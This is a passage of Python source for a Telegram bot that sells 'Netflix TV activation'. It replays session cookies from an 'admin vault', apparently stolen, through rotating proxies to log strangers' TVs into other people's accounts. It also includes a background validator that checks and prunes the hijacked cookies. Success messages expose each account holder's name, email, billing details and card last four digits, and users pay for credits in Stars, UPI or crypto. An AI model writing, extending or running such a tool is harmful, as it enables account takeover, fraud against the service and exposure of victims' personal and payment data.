            "plan":           _re_get([r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"'], t),
            "email":          _re_get([r'"primaryEmail"\s*:\s*"([^"]+)"'], t),
            "name":           _re_get([r'"firstName"\s*:\s*"([^"]+)"', r'"profileName"\s*:\s*"([^"]+)"'], t),
            "phone":          _re_get([r'"phoneNumber"\s*:\s*"([^"]+)"'], t),
            "phone_verified": _re_get([r'"phoneVerified"\s*:\s*(true|false)'], t),
            "member_since":   _re_get([r'"memberSince"\s*:\s*"([^"]+)"', r'"signupDate"\s*:\s*"([^"]+)"'], t),
            "next_billing":   _re_get([r'"nextBillingDate"\s*:\s*"([^"]+)"', r'"renewalDate"\s*:\s*"([^"]+)"'], t),
            "price":          _re_get([r'"localizedCost"\s*:\s*"([^"]+)"', r'"planCost"\s*:\s*"([^"]+)"'], t),
            "payment_method": _re_get([r'"paymentMethodType"\s*:\s*"([^"]+)"'], t),
            "card_brand":     _re_get([r'"creditCardBrand"\s*:\s*"([^"]+)"'], t),
            "last4":          _re_get([r'"creditCardLastFour"\s*:\s*"(\d{4})"', r'"lastFour"\s*:\s*"(\d{4})"'], t),
            "max_streams":    _re_get([r'"maxStreams"\s*:\s*(\d+)', r'"simultaneousStreams"\s*:\s*(\d+)'], t),
            "video_quality":  _re_get([r'"videoQuality"\s*:\s*"([^"]+)"'], t),
            "profiles":       _re_get([r'"numProfiles"\s*:\s*(\d+)'], t),
            "extra_member":   _re_get([r'"extraMember"\s*:\s*"?([^",\s]+)"?'], t),
        }
        return True, info
    except requests.exceptions.ProxyError:
        if proxy: _mark_proxy_dead(proxy); return False, {}
    except Exception: return False, {}

TV_ERROR_PATTERNS = [
    r"that code wasn'?t right", r"code (is )?(incorrect|invalid|wrong)", r"try again",
    r"ese c[oó]digo no", r"int[ée]ntalo de nuevo", r"r[ée]essayez",
    r"代码(有误|错误|无效)", r"코드(가|는)?(잘못|틀렸)",
]
TV_SUCCESS_PATTERNS = [
    r"your tv is ready", r"tu tv est[aá] lista", r"sua tv est[aá] pronta",
    r"dein tv ist bereit", r"tv'niz hazır",
]

def _is_tv_error(text):
    low = text.lower(); return any(re.search(p, low) for p in TV_ERROR_PATTERNS)

def _is_tv_success(url, text):
    if "/tv/out/success" in url.lower(): return True
    return any(re.search(p, text.lower()) for p in TV_SUCCESS_PATTERNS)

def _extract_auth_url(html):
    for pat in [r'name="authURL"\s+value="([^"]+)"', r'authURL["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'value="(c1\.[^"]+)"']:
        m = re.search(pat, html)
        if m: return urllib.parse.unquote(m.group(1))
    return None

def submit_tv_code(session, tv_code, proxy=None):
    url = "https://www.netflix.com/tv8"
    hdr = {"User-Agent": USER_AGENT, "Accept": "text/html,*/*", "Accept-Language": "en-US,en;q=0.9"}
    try:
        r = session.get(url, headers=hdr, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200: return {"success": False, "error": "Netflix TV page unavailable"}
    except Exception: return {"success": False, "error": "Connection failed"}
    auth_url = _extract_auth_url(r.text)
    if not auth_url:
        fb = re.search(r'c1\.[a-zA-Z0-9%+=/]+', r.text)
        auth_url = fb.group(0) if fb else None
    if not auth_url: return {"success": False, "error": "Could not load activation page"}
    form = {"flow": "websiteSignUp", "authURL": auth_url, "flowMode": "enterTvLoginRendezvousCode",
            "withFields": "tvLoginRendezvousCode,isTvUrl2", "code": tv_code,
            "tvLoginRendezvousCode": tv_code, "action": "nextAction"}
    post_hdr = {**hdr, "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://www.netflix.com/tv8", "Origin": "https://www.netflix.com"}
    try:
        r = session.post(url, data=form, headers=post_hdr, proxies=proxy,
                         timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
    except Exception: return {"success": False, "error": "Activation request failed"}
    final_url = getattr(r, "url", url)
    if "/tv/out/success" in final_url.lower(): return {"success": True}
    import html as _html
    txt = re.sub(r'<script[^>]*>.*?</script>', '', r.text, flags=re.DOTALL|re.IGNORECASE)
    txt = re.sub(r'<style[^>]*>.*?</style>', '', txt, flags=re.DOTALL|re.IGNORECASE)
    txt = re.sub(r'<[^>]+>', ' ', txt); txt = _html.unescape(txt); txt = re.sub(r'\s+', ' ', txt).strip()
    if _is_tv_error(txt): return {"success": False, "error": "Invalid or expired TV code"}
    if _is_tv_success(final_url, txt): return {"success": True}
    return {"success": False, "error": "Unknown response from Netflix"}

def process_tv_login_free(tv_code):
    """Use admin vault cookie."""
    source, cookies, info = pop_validated_cookie()
    if not cookies: return {"success": False, "error": "no_cookies"}
    proxy = _get_proxy(); session = requests.Session(); session.cookies.update(cookies)
    result = submit_tv_code(session, tv_code, proxy)
    result["info"] = info; result["cookie_source"] = source
    return result

def process_tv_login_own(user_id, tv_code):
    """Use user's own cookie."""
    source, cookies = pop_user_cookie(user_id)
    if not cookies: return {"success": False, "error": "no_own_cookies"}
    proxy = _get_proxy()
    valid, info = validate_and_get_info(cookies, proxy)
    if not valid: return {"success": False, "error": "own_cookie_dead"}
    session = requests.Session(); session.cookies.update(cookies)
    result = submit_tv_code(session, tv_code, proxy)
    result["info"] = info; result["cookie_source"] = "own"
    return result

# ══════════════════════════════════════════════════════════════════════
#  BACKGROUND COOKIE VALIDATOR
# ══════════════════════════════════════════════════════════════════════
async def background_cookie_validator(app):
    while True:
        await asyncio.sleep(COOKIE_VALIDATION_HRS * 3600)
        try:
            c = db()
            rows = c.execute("SELECT id,data FROM cookies WHERE alive=1 ORDER BY last_checked ASC LIMIT ?",
                             (COOKIE_VALIDATION_BATCH,)).fetchall()
            c.close()
            checked = dead = 0
            for row in rows:
                try: cdict = json.loads(row["data"])
                except Exception: cdict = None
                proxy = _get_proxy()
                if cdict:
                    valid, info = validate_and_get_info(cdict, proxy)
                    c2 = db()
                    if valid:
                        c2.execute("UPDATE cookies SET alive=1,last_checked=?,country=? WHERE id=?",
                                   (int(time.time()), info.get("country",""), row["id"]))
                    else:
                        c2.execute("DELETE FROM cookies WHERE id=?", (row["id"],)); dead += 1
                    c2.commit(); c2.close(); checked += 1
                await asyncio.sleep(0.5)
            if checked: print(f"[Validator] Checked {checked}, deleted {dead} dead.")
        except Exception as e: print(f"[Validator] Error: {e}")

# ══════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════
def fmt_seconds(s):
    h, m = int(s)//3600, (int(s)%3600)//60
    return f"{h}h {m}m" if h else f"{m}m"

def fmt_ts(ts):
    if not ts or ts == 0: return "Never"
    return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M")

BRAILLE = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
PHASES  = ["ꜱᴄᴀɴɴɪɴɢ ᴠᴀᴜʟᴛ", "ᴠᴀʟɪᴅᴀᴛɪɴɢ ᴄᴏᴏᴋɪᴇ", "ꜱᴜʙᴍɪᴛᴛɪɴɢ ᴛᴠ ᴄᴏᴅᴇ", "ғɪɴᴀʟɪᴢɪɴɢ ʟᴏɢɪɴ"]

async def animate(context, chat_id, msg_id, stop_event, tv_code):
    i = 0
    while not stop_event.is_set():
        frame = BRAILLE[i % len(BRAILLE)]; phase = PHASES[min(i//15, len(PHASES)-1)]; dots = "."*((i//3)%4)
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id,
                text=(f"{frame} <b>{phase}{dots}</b>\n\n"
                      f"📺 ᴄᴏᴅᴇ: <code>{tv_code}</code>\n"
                      f"<i>ʜᴏʟᴅ ᴛɪɢʜᴛ...</i>"),
                parse_mode=ParseMode.HTML)
        except Exception: pass
        i += 1; await asyncio.sleep(0.4)

def build_success_msg(tv_code, info, source, login_no):
    country = info.get("country","Unknown"); flag = get_flag(country)
    def v(k): val = info.get(k,""); return val if val and val!="Unknown" else "N/A"
    return (
        f"✅ <b>ʟᴏɢɪɴ ꜱᴜᴄᴄᴇꜱꜱғᴜʟ!</b>\n\n"
        f"🏆 <b>ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴏᴜɴᴛ #{login_no}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📁 ꜱᴏᴜʀᴄᴇ: <code>{source}</code>\n"
        f"👤 ɴᴀᴍᴇ: <b>{v('name')}</b>\n"
        f"🌍 ᴄᴏᴜɴᴛʀʏ: <b>{country} {flag}</b>\n"
        f"📋 ᴘʟᴀɴ: <b>{v('plan')}</b>\n"
        f"💰 ᴘʀɪᴄᴇ: <b>{v('price')}</b>\n"
        f"📅 ᴍᴇᴍʙᴇʀ ꜱɪɴᴄᴇ: <b>{v('member_since')}</b>\n"
        f"📅 ɴᴇxᴛ ʙɪʟʟɪɴɢ: <b>{v('next_billing')}</b>\n"
        f"💳 ᴘᴀʏᴍᴇɴᴛ: <b>{v('payment_method')}</b>  🔢 {v('last4')}\n"
        f"🎥 ǫᴜᴀʟɪᴛʏ: <b>{v('video_quality')}</b>  📺 ꜱᴛʀᴇᴀᴍꜱ: <b>{v('max_streams')}</b>\n"
        f"📧 ᴇᴍᴀɪʟ: <b>{v('email')}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🍿 <b>ᴇɴᴊᴏʏ ʏᴏᴜʀ ɴᴇᴛғʟɪx!</b>"
    )

# ══════════════════════════════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════════════════════════════
def main_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🖥 ᴀᴄᴛɪᴠᴀᴛᴇ ᴛᴠ",      callback_data="activate_menu"),
         InlineKeyboardButton("🔑 ʟᴏɢɪɴ ᴍʏ ᴄᴏᴏᴋɪᴇ", callback_data="own_cookie_menu")],
        [InlineKeyboardButton("📊 ᴍʏ ꜱᴛᴀᴛꜱ",         callback_data="my_stats"),
         InlineKeyboardButton("📜 ʜɪꜱᴛᴏʀʏ",          callback_data="history:1")],
        [InlineKeyboardButton("❓ ʜᴇʟᴘ",              callback_data="help"),
         InlineKeyboardButton("🌐 ʟᴀɴɢᴜᴀɢᴇ",         callback_data="lang_menu")],
    ])

def back_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="back_start")]])

def activate_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ ғʀᴇᴇ ᴀᴄᴛɪᴠᴀᴛᴇ",        callback_data="free_activate")],
        [InlineKeyboardButton("🔐 ᴀᴄᴛɪᴠᴀᴛᴇ ᴡɪᴛʜ ᴍʏ ᴄᴏᴏᴋɪᴇ", callback_data="own_cookie_menu")],
        [InlineKeyboardButton("🔙 ʙᴀᴄᴋ",                 callback_data="back_start")],
    ])

def free_activate_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❓ ʜᴏᴡ ᴛᴏ ғɪɴᴅ ᴄᴏᴅᴇ", callback_data="how_to_find")],
        [InlineKeyboardButton("🔙 ʙᴀᴄᴋ",             callback_data="activate_menu")],
    ])

def own_cookie_format_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📄 ꜱᴇɴᴅ .ᴛxᴛ", callback_data="send_txt")],
        [InlineKeyboardButton("📦 ꜱᴇɴᴅ .ᴢɪᴘ", callback_data="send_zip")],
        [InlineKeyboardButton("🔙 ʙᴀᴄᴋ",      callback_data="activate_menu")],
    ])

def cancel_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ ᴄᴀɴᴄᴇʟ", callback_data="cancel_state")]])

def after_login_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📺 ᴀᴄᴛɪᴠᴀᴛᴇ ᴀɴᴏᴛʜᴇʀ ᴛᴠ", callback_data="activate_menu")],
        [InlineKeyboardButton("🏠 ᴍᴀɪɴ ᴍᴇɴᴜ",          callback_data="back_start")],
    ])

def error_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔁 ᴛʀʏ ᴀɢᴀɪɴ",  callback_data="activate_menu")],
        [InlineKeyboardButton("💬 ꜱᴜᴘᴘᴏʀᴛ",    url=f"https://t.me/{SUPPORT_USERNAME}")],
    ])

def buy_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("10 ᴄʀᴇᴅɪᴛꜱ — 10⭐ | ₹10",          callback_data="buy_plan_plan_10cr")],
        [InlineKeyboardButton("♾️ ᴜɴʟɪᴍɪᴛᴇᴅ 30d — 300⭐ | ₹250",  callback_data="buy_plan_plan_unlimited")],
        [InlineKeyboardButton("🔙 ʙᴀᴄᴋ",                           callback_data="back_start")],
    ])

def lang_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🇬🇧 English",  callback_data="setlang_en"),
         InlineKeyboardButton("🇮🇳 Hinglish", callback_data="setlang_hi")],
        [InlineKeyboardButton("🔙 ʙᴀᴄᴋ",     callback_data="back_start")],
    ])

def history_kb(page, total_pages):
    buttons = []
    nav = []
    if page > 1:      nav.append(InlineKeyboardButton("⬅️", callback_data=f"history:{page-1}"))
    nav.append(InlineKeyboardButton(f"{page}/{total_pages}", callback_data="noop"))
    if page < total_pages: nav.append(InlineKeyboardButton("➡️", callback_data=f"history:{page+1}"))
    if nav: buttons.append(nav)
    buttons.append([InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="back_start")])
    return InlineKeyboardMarkup(buttons)

def plan_pay_kb(plan_key):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⭐ ᴘᴀʏ ᴡɪᴛʜ ꜱᴛᴀʀꜱ",  callback_data=f"pay_stars_{plan_key}")],
        [InlineKeyboardButton("💸 ᴘᴀʏ ᴠɪᴀ ᴜᴘɪ",      callback_data=f"pay_upi_{plan_key}")],
        [InlineKeyboardButton("₿ ᴘᴀʏ ᴠɪᴀ ᴄʀʏᴘᴛᴏ",    callback_data=f"pay_crypto_{plan_key}")],
        [InlineKeyboardButton("🔙 ʙᴀᴄᴋ",             callback_data="buy_menu")],
    ])

# ══════════════════════════════════════════════════════════════════════
#  START  /start
# ══════════════════════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ensure_user(user.id, user.first_name or "", user.username or "")
    with active_lock: active_users[user.id] = time.time()
    context.user_data.clear()

    if is_banned(user.id):
        await update.message.reply_text("🚫 ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ ғʀᴏᴍ ᴜꜱɪɴɢ ᴛʜɪꜱ ʙᴏᴛ."); return

    await update.message.reply_text(
        f"✨ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ɴᴇᴛғʟɪx ᴛᴠ ʟᴏɢɪɴ ✨\n\n"
        f"👋 ʜᴇʟʟᴏ {user.first_name}\n"
        f"🆔 ɪᴅ: <code>{user.id}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✨ ᴡʜᴀᴛ ʏᴏᴜ ᴄᴀɴ ᴅᴏ:\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 ᴀᴄᴛɪᴠᴀᴛᴇ ɴᴇᴛғʟɪx ᴏɴ ʏᴏᴜʀ ᴛᴠ\n"
        f"📺 ꜱᴜʙᴍɪᴛ 8-ᴅɪɢɪᴛ ᴛᴠ ᴄᴏᴅᴇ\n"
        f"📊 ᴛʀᴀᴄᴋ ʏᴏᴜʀ ʟᴏɢɪɴ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ\n"
        f"🍪 ᴀᴅᴅ ʏᴏᴜʀ ᴘʀɪᴠᴀᴛᴇ ᴄᴏᴏᴋɪᴇꜱ ғᴏʀ ᴛᴠ ʟᴏɢɪɴ\n"
        f"🛠 ᴀᴄᴄᴇꜱꜱ ʜᴇʟᴘ & ꜱᴜᴘᴘᴏʀᴛ\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML, reply_markup=main_kb(),
    )

async def _send_start(query, user):
    """Re-send start menu via edit (for back buttons)."""
    context_data = {}
    await query.edit_message_text(
        f"✨ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ɴᴇᴛғʟɪx ᴛᴠ ʟᴏɢɪɴ ✨\n\n"
        f"👋 ʜᴇʟʟᴏ {user.first_name}\n"
        f"🆔 ɪᴅ: <code>{user.id}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✨ ᴡʜᴀᴛ ʏᴏᴜ ᴄᴀɴ ᴅᴏ:\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 ᴀᴄᴛɪᴠᴀᴛᴇ ɴᴇᴛғʟɪx ᴏɴ ʏᴏᴜʀ ᴛᴠ\n"
        f"📺 ꜱᴜʙᴍɪᴛ 8-ᴅɪɢɪᴛ ᴛᴠ ᴄᴏᴅᴇ\n"
        f"📊 ᴛʀᴀᴄᴋ ʏᴏᴜʀ ʟᴏɢɪɴ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ\n"
        f"🍪 ᴀᴅᴅ ʏᴏᴜʀ ᴘʀɪᴠᴀᴛᴇ ᴄᴏᴏᴋɪᴇꜱ ғᴏʀ ᴛᴠ ʟᴏɢɪɴ\n"
        f"🛠 ᴀᴄᴄᴇꜱꜱ ʜᴇʟᴘ & ꜱᴜᴘᴘᴏʀᴛ\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML, reply_markup=main_kb(),
    )

# ══════════════════════════════════════════════════════════════════════
#  /tv COMMAND  (direct shortcut)
# ══════════════════════════════════════════════════════════════════════
async def cmd_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ensure_user(user.id, user.first_name or "", user.username or "")
    if is_banned(user.id): await update.message.reply_text("🚫 ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ."); return

    raw     = " ".join(context.args) if context.args else ""
    tv_code = re.sub(r"\D", "", raw)

    if not raw:
        context.user_data["state"] = ST_TV_FREE
        await update.message.reply_text(s(user.id, "free_activate_prompt"),
                                        parse_mode=ParseMode.HTML, reply_markup=free_activate_kb())
        return

    if len(tv_code) != 8:
        await update.message.reply_text(
            f"❌ ɪɴᴠᴀʟɪᴅ ᴄᴏᴅᴇ.\nDigits found: <b>{len(tv_code)}</b> — need exactly 8.\n"
            f"💡 Example: <code>/tv 1234-5678</code>", parse_mode=ParseMode.HTML); return

    await _run_free_login(update, context, user, tv_code, is_callback=False)

# ══════════════════════════════════════════════════════════════════════
#  /stats COMMAND
# ══════════════════════════════════════════════════════════════════════
async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ensure_user(user.id, user.first_name or "", user.username or "")
    await _show_stats(update.message.reply_text, user)

async def _show_stats(send_fn, user):
    row = get_user_row(user.id)
    credits_left, reset_in, unlimited_flag = get_credits_status(user.id)
    now = int(time.time())
    c = db()
    total_users   = c.execute("SELECT COUNT(*) AS n FROM users").fetchone()["n"]
    total_acts    = c.execute("SELECT COUNT(*) AS n FROM login_log WHERE success=1").fetchone()["n"]
    total_all     = c.execute("SELECT COUNT(*) AS n FROM login_log").fetchone()["n"]
    today_user    = c.execute(
        "SELECT COUNT(*) AS n FROM login_log WHERE user_id=? AND ts > strftime('%s','now','-1 day')",
        (user.id,)).fetchone()["n"]
    with active_lock:
        active_now = sum(1 for t in active_users.values() if now - t <= 300)
    c.close()
    success_rate = f"{total_acts*100//total_all}%" if total_all else "N/A"
    today_rem = MAX_CREDITS - min(row.get("credits_used",0), MAX_CREDITS)
    if unlimited_flag: today_rem_str = "♾️ Unlimited"
    else: today_rem_str = str(today_rem)

    await send_fn(
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡️ ɴᴇᴛғʟɪx ᴛᴠ ʟᴏɢɪɴ ꜱᴛᴀᴛꜱ ⚡️\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 ɴᴀᴍᴇ: {user.first_name}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🌍 ɢʟᴏʙᴀʟ ᴀᴄᴛɪᴠᴀᴛɪᴏɴ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ: {total_users}\n"
        f"📺 ᴛᴏᴛᴀʟ ᴛᴠ ᴀᴄᴛɪᴠᴀᴛɪᴏɴꜱ: {total_acts}\n"
        f"👑 ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ: {success_rate}\n"
        f"⚡️ ᴀᴄᴛɪᴠᴇ ꜱᴇꜱꜱɪᴏɴꜱ: {active_now}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 ʏᴏᴜʀ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 ʏᴏᴜʀ ᴛᴏᴛᴀʟ ᴀᴄᴛɪᴠᴀᴛɪᴏɴꜱ: {row.get('successful_logins',0)}\n"
        f"📅 ᴛᴏᴅᴀʏꜱ ᴀᴄᴛɪᴠᴀᴛɪᴏɴꜱ: {today_user} / {MAX_CREDITS}\n"
        f"⏳ ʀᴇᴍᴀɪɴɪɴɢ ᴛᴏᴅᴀʏ: {today_rem_str}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🚀 ᴋᴇᴇᴘ ᴀᴄᴛɪᴠᴀᴛɪɴɢ. ᴋᴇᴇᴘ ꜱᴛʀᴇᴀᴍɪɴɢ. ✨\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("💎 ʙᴜʏ ᴄʀᴇᴅɪᴛꜱ",  callback_data="buy_menu")],
            [InlineKeyboardButton("🔙 ʙᴀᴄᴋ",         callback_data="back_start")],
        ]),
    )

# ══════════════════════════════════════════════════════════════════════
#  /login COMMAND
# ══════════════════════════════════════════════════════════════════════
async def cmd_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ensure_user(user.id, user.first_name or "", user.username or "")
    if is_banned(user.id): await update.message.reply_text("🚫 ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ."); return
    used = count_user_cookies(user.id)
    await update.message.reply_text(
        s(user.id, "own_cookie_menu", used=used),
        parse_mode=ParseMode.HTML, reply_markup=own_cookie_format_kb())

# ══════════════════════════════════════════════════════════════════════
#  /help COMMAND
# ══════════════════════════════════════════════════════════════════════
async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(_help_text(), parse_mode=ParseMode.HTML, reply_markup=back_kb())

def _help_text():
    return (
        "━━━━━━━━━━━━━━━━━━━━\n"
        "❓ ʜᴇʟᴘ & ᴄᴏᴍᴍᴀɴᴅꜱ\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📺 ʜᴏᴡ ᴛᴏ ᴀᴄᴛɪᴠᴀᴛᴇ ɴᴇᴛғʟɪx ᴏɴ ᴛᴠ:\n\n"
        "1️⃣ ᴏᴘᴇɴ ɴᴇᴛғʟɪx ᴏɴ ʏᴏᴜʀ ᴛᴠ\n"
        "2️⃣ ʏᴏᴜ ᴡɪʟʟ ꜱᴇᴇ ᴀɴ 8-ᴅɪɢɪᴛ ᴄᴏᴅᴇ\n"
        "3️⃣ ꜱᴇɴᴅ ᴛʜᴇ ᴄᴏᴅᴇ ᴛᴏ ᴛʜɪꜱ ʙᴏᴛ\n"
        "4️⃣ ᴡᴀɪᴛ ғᴏʀ ᴀᴄᴛɪᴠᴀᴛɪᴏɴ ᴄᴏɴғɪʀᴍᴀᴛɪᴏɴ\n"
        "5️⃣ ᴇɴᴊᴏʏ ɴᴇᴛғʟɪx ᴏɴ ʏᴏᴜʀ ᴛᴠ! 🎉\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 ʙᴏᴛ ᴄᴏᴍᴍᴀɴᴅꜱ:\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🏠 /start — ꜱᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ & ᴍᴀɪɴ ᴍᴇɴᴜ\n"
        "📺 /tv — ᴀᴄᴛɪᴠᴀᴛᴇ ɴᴇᴛғʟɪx ᴏɴ ʏᴏᴜʀ ᴛᴠ\n"
        "📊 /stats — ᴠɪᴇᴡ ʏᴏᴜʀ ʟᴏɢɪɴ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ\n"
        "🔐 /login — ᴀᴅᴅ ʏᴏᴜʀ ᴘʀɪᴠᴀᴛᴇ ᴄᴏᴏᴋɪᴇ\n"
        "❓ /help — ꜱʜᴏᴡ ᴛʜɪꜱ ʜᴇʟᴘ ᴍᴇɴᴜ\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💬 ꜱᴜᴘᴘᴏʀᴛ: @{SUPPORT_USERNAME}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )

# ══════════════════════════════════════════════════════════════════════
#  CORE LOGIN RUNNER
# ══════════════════════════════════════════════════════════════════════
async def _run_free_login(update_or_msg, context, user, tv_code, is_callback=False):
    chat_id = user.id
    if is_callback:
        status_msg = await context.bot.send_message(
            chat_id,
            f"⠋ <b>ꜱᴛᴀʀᴛɪɴɢ ʟᴏɢɪɴ...</b>\n\n📺 ᴄᴏᴅᴇ: <code>{tv_code}</code>",
            parse_mode=ParseMode.HTML)
    else:
        status_msg = await update_or_msg.message.reply_text(
            f"⠋ <b>ꜱᴛᴀʀᴛɪɴɢ ʟᴏɢɪɴ...</b>\n\n📺 ᴄᴏᴅᴇ: <code>{tv_code}</code>",
            parse_mode=ParseMode.HTML)

    if count_vault() == 0:
        await status_msg.edit_text(s(user.id, "vault_empty"), parse_mode=ParseMode.HTML,
                                   reply_markup=error_kb()); return

    allowed, credits_left, reset_in = check_and_use_credit(user.id)
    if not allowed:
        await status_msg.edit_text(
            s(user.id, "no_credits", reset=fmt_seconds(reset_in), hrs=CREDIT_RESET_HRS),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💎 ʙᴜʏ ᴄʀᴇᴅɪᴛꜱ", callback_data="buy_menu")],
                [InlineKeyboardButton("💬 ꜱᴜᴘᴘᴏʀᴛ", url=f"https://t.me/{SUPPORT_USERNAME}")],
            ])); return

    stop_anim = asyncio.Event()
    anim_task = asyncio.create_task(animate(context, chat_id, status_msg.message_id, stop_anim, tv_code))
    result    = await asyncio.to_thread(process_tv_login_free, tv_code)
    stop_anim.set(); anim_task.cancel(); await asyncio.sleep(0.3)

    await _handle_login_result(status_msg, context, user, tv_code, result, refund_on_fail=True)

async def _run_own_login(context, user, tv_code, status_msg):
    stop_anim = asyncio.Event()
    anim_task = asyncio.create_task(animate(context, user.id, status_msg.message_id, stop_anim, tv_code))
    result    = await asyncio.to_thread(process_tv_login_own, user.id, tv_code)
    stop_anim.set(); anim_task.cancel(); await asyncio.sleep(0.3)
    await _handle_login_result(status_msg, context, user, tv_code, result, refund_on_fail=False)

async def _handle_login_result(status_msg, context, user, tv_code, result, refund_on_fail=True):
    global _low_vault_alerted
    success_flag = 1 if result.get("success") else 0
    info_dict    = result.get("info", {})

    c = db()
    c.execute("INSERT INTO login_log (user_id,tv_code,success,cookie_source,country) VALUES (?,?,?,?,?)",
              (user.id, tv_code, success_flag, result.get("cookie_source",""), info_dict.get("country","")))
    c.commit(); c.close()

    with stats_lock:
        rt_stats["total_logins"] += 1
        if success_flag: rt_stats["successful"] += 1
        else: rt_stats["failed"] += 1

    if result.get("success"):
        mark_successful_login(user.id)
        login_no = get_user_success_count(user.id)
        await status_msg.edit_text(
            build_success_msg(tv_code, info_dict, result.get("cookie_source","vault"), login_no),
            parse_mode=ParseMode.HTML, reply_markup=after_login_kb())
        remaining = count_vault()
        if remaining <= VAULT_LOW_THRESHOLD and not _low_vault_alerted:
            _low_vault_alerted = True
            for aid in ADMIN_IDS:
                try:
                    await context.bot.send_message(
                        aid,
                        f"⚠️ <b>ᴠᴀᴜʟᴛ ʟᴏᴡ ᴀʟᴇʀᴛ!</b>\n🍪 Only <b>{remaining}</b> cookies left!",
                        parse_mode=ParseMode.HTML)
                except Exception: pass
        elif remaining > VAULT_LOW_THRESHOLD: _low_vault_alerted = False

    elif result.get("error") == "no_cookies":
        if refund_on_fail: refund_credit(user.id)
        await status_msg.edit_text(
            "😔 <b>ᴠᴀᴜʟᴛ ᴇxʜᴀᴜꜱᴛᴇᴅ!</b>\nRan out of cookies. Your credit was refunded.",
            parse_mode=ParseMode.HTML, reply_markup=error_kb())

    elif result.get("error") in ("no_own_cookies", "own_cookie_dead"):
        await status_msg.edit_text(
            "❌ <b>ʏᴏᴜʀ ᴄᴏᴏᴋɪᴇ ɪꜱ ᴇxᴘɪʀᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ!</b>\n"
            "Please upload a fresh cookie.",
            parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔐 ᴜᴘʟᴏᴀᴅ ɴᴇᴡ ᴄᴏᴏᴋɪᴇ", callback_data="own_cookie_menu")],
                [InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="back_start")],
            ]))

    elif result.get("error") == "Invalid or expired TV code":
        with stats_lock: rt_stats["codes_rejected"] += 1
        await status_msg.edit_text(
